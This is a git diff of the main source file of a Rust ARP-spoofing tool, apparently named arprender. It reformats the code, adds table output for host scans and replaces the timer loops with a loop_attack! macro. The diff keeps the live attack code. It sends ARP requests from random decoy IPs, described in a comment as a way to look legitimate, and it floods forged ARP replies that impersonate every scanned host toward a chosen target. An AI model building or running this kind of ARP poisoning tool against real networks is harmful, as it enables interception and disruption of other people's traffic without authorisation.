@@ -4,11 +4,12 @@ use clap::Parser;
 use cli::{Args, Commands};
 
 use arprender::{arp_scan, resolve_mac, send_arp_reply, send_arp_request};
-use tabled::{settings::{Alignment, Settings}, Table};
+use tabled::settings::{Alignment, Settings};
 use utils::{is_timer_expired, random_ip_in_network};
 
 pub mod arprender;
 pub mod cli;
+#[macro_use]
 pub mod utils;
 
 fn main() {
@@ -17,30 +18,50 @@ fn main() {
     match args.cmd {
         Commands::Interfaces => {
             let interfaces = arprender::nic::get_interfaces();
-            
+
             // Prepare pretty formatting
             let table_config = Settings::default().with(Alignment::center());
             let mut interfaces_table = tabled::builder::Builder::new();
             interfaces_table.push_record(["Name", "MAC Address", "IP Address"]);
-            
+
             for interface in interfaces {
-                let mac_str = match interface.mac() { Some(mac) => mac.to_string(), None => "None".to_string() } ;
-                let ip_str = match interface.ipv4_address() { Some(ip) => ip.to_string(), None => "None".to_string() } ;
+                let mac_str = match interface.mac() {
+                    Some(mac) => mac.to_string(),
+                    None => "None".to_string(),
+                };
+                let ip_str = match interface.ipv4_address() {
+                    Some(ip) => ip.to_string(),
+                    None => "None".to_string(),
+                };
 
                 interfaces_table.push_record([interface.name(), &mac_str, &ip_str]);
             }
 
-            let mut interfaces_table = interfaces_table.build();
-            println!("{}", interfaces_table.with(table_config).to_string());
+            println!(
+                "{}",
+                interfaces_table.build().with(table_config).to_string()
+            );
         }
         Commands::Scan {
             interface: interface_name,
         } => match arprender::nic::get_interface_by_name(&interface_name) {
             Ok(interface) => match arp_scan(&interface, Duration::from_secs(5)) {
                 Ok(hosts) => {
-                    for host in &hosts {
-                        println!("Found {} @ {}", host.0, host.1);
+                    // Construct output table
+                    let table_config = Settings::default().with(Alignment::center());
+                    let mut interfaces_table = tabled::builder::Builder::new();
+                    interfaces_table.push_record(["IP Address", "MAC Address"]);
+
+                    for host in hosts {
+                        interfaces_table.push_record([host.0.to_string(), host.1.to_string()]);
                     }
+
+                    // Print output
+                    println!("Identified hosts:");
+                    println!(
+                        "{}",
+                        interfaces_table.build().with(table_config).to_string()
+                    );
                 }
                 Err(err) => {
                     println!("{}", err.to_string());
@@ -89,8 +110,6 @@ fn main() {
                             std::process::exit(1);
                         };
 
-                        let mut start = Instant::now();
-                        
                         // Generate a random IP in the range of the network to make the ARP request look legitimate.
                         let attack = || {
                             let decoy_ip = loop {
@@ -105,39 +124,50 @@ fn main() {
                             send_arp_request(&interface, decoy_ip, None, Some(target)).unwrap();
                         };
 
-                        attack();
-                        loop {
-                            if is_timer_expired(start, period) {
-                                start = Instant::now();
-
-                                attack();
-                            }
-                        }
+                        loop_attack!(attack, period);
                     } else {
                         // Perform an ARP scan to detect the available hosts on the network.
+                        println!("Launching ARP scan using timeout {} seconds...", 10);
                         match arp_scan(&interface, Duration::from_secs(10)) {
                             Ok(hosts) => {
+                                // Construct output table
+                                let table_config = Settings::default().with(Alignment::center());
+                                let mut interfaces_table = tabled::builder::Builder::new();
+                                interfaces_table.push_record(["IP Address", "MAC Address"]);
+
+                                for host in &hosts {
+                                    interfaces_table
+                                        .push_record([host.0.to_string(), host.1.to_string()]);
+                                }
+
+                                // Print output
+                                println!("Identified hosts:");
+                                println!(
+                                    "{}",
+                                    interfaces_table.build().with(table_config).to_string()
+                                );
+
+                                println!("Launching ARP impersonation attack...");
                                 let attack = || {
                                     for host in &hosts {
-                                        send_arp_reply(&interface, host.1, host.0, None, Some(target)).unwrap();
+                                        send_arp_reply(
+                                            &interface,
+                                            host.1,
+                                            host.0,
+                                            None,
+                                            Some(target),
+                                        )
+                                        .unwrap();
                                     }
                                 };
 
-                                let mut start = Instant::now();
-                                attack();
-
-                                loop {
-                                    if is_timer_expired(start, period) {
-                                        start = Instant::now();
-        
-                                        attack();
-                                    }
-                                }
-                            },
-                            Err(err) => { eprintln!("{}", err.to_string()); std::process::exit(1); }
+                                loop_attack!(attack, period);
+                            }
+                            Err(err) => {
+                                eprintln!("{}", err.to_string());
+                                std::process::exit(1);
+                            }
                         }
-
-
                     }
                 }
                 Err(err) => {
